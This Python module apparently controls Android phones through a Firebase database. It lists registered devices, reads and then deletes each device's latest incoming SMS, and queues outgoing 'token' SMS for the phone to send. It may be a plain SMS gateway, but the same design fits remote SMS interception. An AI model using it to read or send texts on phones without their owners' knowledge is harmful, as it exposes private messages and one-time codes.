import requests
import json
import time

def check_firebase_online(firebase_url: str) -> bool:
    try:
        r = requests.get(f"{firebase_url.rstrip('/')}.json?shallow=true", timeout=4)
        return r.status_code == 200
    except Exception:
        return False

def get_devices(firebase_url: str) -> dict:
    """Fetch all registered device IDs from /clients/"""
    try:
        r = requests.get(
            f"{firebase_url.rstrip('/')}/clients.json?shallow=true",
            timeout=5
        )
        data = r.json()
        if isinstance(data, dict):
            return data
        return {}
    except Exception:
        return {}

def get_device_status(firebase_url: str, device_id: str) -> str:
    """
    Device is Online if its key exists under /clients/
    The android app registers itself there on boot.
    """
    try:
        r = requests.get(
            f"{firebase_url.rstrip('/')}/clients/{device_id}.json",
            timeout=4
        )
        data = r.json()
        if data is not None:
            return "🟢 Online"
        return "🔴 Offline"
    except Exception:
        return "❓ Unknown"

def read_incoming_sms(firebase_url: str, device_id: str, sim: str) -> list:
    """
    Reads latest SMS from /messages/{device_id}/
    Each message has: sender, message, id, dateTime
    sim param kept for API compatibility but not used in path
    (android app doesn't split by sim in firebase)
    """
    try:
        r = requests.get(
            f"{firebase_url.rstrip('/')}/messages/{device_id}.json?shallow=true",
            timeout=4
        )
        keys = r.json()
        if not isinstance(keys, dict):
            return []

        results = []
        for key in list(keys.keys())[-10:]:
            try:
                msg_r = requests.get(
                    f"{firebase_url.rstrip('/')}/messages/{device_id}/{key}.json",
                    timeout=4
                )
                val = msg_r.json()
                if isinstance(val, dict):
                    results.append({
                        "key": key,
                        "from": val.get("sender", ""),
                        "body": val.get("message", "")
                    })
            except Exception:
                continue
        return results
    except Exception:
        return []

def clear_sms_entry(firebase_url: str, device_id: str, sim: str, key: str):
    """Delete processed SMS so it doesn't re-trigger."""
    try:
        requests.delete(
            f"{firebase_url.rstrip('/')}/messages/{device_id}/{key}.json",
            timeout=4
        )
    except Exception:
        pass

def send_token_via_device(firebase_url: str, device_id: str, sim: str, to: str, body: str) -> bool:
    """
    Write outgoing SMS command to /outgoing/{device_id}/
    Android app listens here and fires the SMS.
    """
    payload = {
        "to": to,
        "body": body,
        "sim": sim,
        "timestamp": int(time.time())
    }
    try:
        r = requests.put(
            f"{firebase_url.rstrip('/')}/outgoing/{device_id}.json",
            data=json.dumps(payload),
            timeout=3
        )
        return r.status_code == 200
    except Exception:
        return False
